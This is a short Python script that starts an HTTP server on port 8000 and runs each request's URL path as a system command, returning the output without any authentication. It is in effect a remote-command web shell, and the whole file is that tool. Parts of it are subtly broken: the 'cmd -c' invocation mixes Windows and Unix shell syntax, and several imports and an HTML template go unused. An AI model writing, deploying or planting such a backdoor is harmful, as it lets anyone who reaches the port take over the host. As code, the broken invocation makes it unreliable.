import os
import subprocess
from argparse import ArgumentParser
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, HTTPServer

index_page = '<!DOCTYPE html><html><head><title>Index</title><style>a{display:block;margin:16px}</style></head><body>%s</body></html>'


def shellHTTPRequestHandler():

    class ShellHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            parsed_url = urlparse(self.path)
  
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(subprocess.check_output(['cmd', '-c', parsed_url.path[1:]]))

    return ShellHTTPRequestHandler

with HTTPServer(('', 8000), shellHTTPRequestHandler()) as httpd:
        httpd.serve_forever()
